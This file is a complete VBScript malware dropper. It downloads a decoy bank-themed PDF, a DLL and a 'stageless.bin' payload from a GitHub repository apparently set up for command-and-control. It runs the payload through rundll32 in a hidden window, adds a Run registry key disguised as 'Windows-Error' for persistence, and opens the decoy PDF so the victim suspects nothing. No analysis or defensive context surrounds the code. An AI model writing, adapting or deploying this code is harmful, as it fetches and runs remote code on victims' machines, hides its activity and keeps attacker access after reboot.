Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' ProgramData path
programDataDir = objShell.ExpandEnvironmentStrings("%ProgramData%")

' Destination paths
destPdf = programDataDir & "\BANK_FRANCHISE.pdf"
destDll = programDataDir & "\zxcvbnm.dll"
destBin = programDataDir & "\stageless.bin"

' GitHub raw URLs - replace with your actual URLs
pdfUrl = "https://raw.githubusercontent.com/c2tunnelgit/serve_it/main/BANK_FRANCHISE.pdf"
dllUrl = "https://raw.githubusercontent.com/c2tunnelgit/serve_it/main/zxcvbnm.dll"
binUrl = "https://raw.githubusercontent.com/c2tunnelgit/serve_it/main/stageless.bin"

' Download files
DownloadFile pdfUrl, destPdf
DownloadFile dllUrl, destDll
DownloadFile binUrl, destBin

' Execute DLL if downloads succeeded
If objFSO.FileExists(destDll) And objFSO.FileExists(destBin) Then
    runCommand = "rundll32.exe " & destDll & ",HelperFunc " & destBin
    objShell.Run runCommand, 0, False
End If

' Set registry key for persistence
regKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regKeyName = "Windows-Error"
regKeyCommand = "rundll32.exe " & destDll & ",HelperFunc " & destBin
objShell.RegWrite regKeyPath & "\" & regKeyName, regKeyCommand, "REG_SZ"

' Open PDF silently
If objFSO.FileExists(destPdf) Then
    objShell.Run """" & destPdf & """", 0, False
End If

' -------- Subroutine to download file --------
Sub DownloadFile(strURL, strSavePath)
    Dim xhr, stream
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", strURL, False
    xhr.Send

    If xhr.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write xhr.responseBody
        stream.SaveToFile strSavePath, 2 ' Overwrite if exists
        stream.Close
    Else
        WScript.Echo "Failed to download: " & strURL & " Status: " & xhr.Status
    End If
End Sub
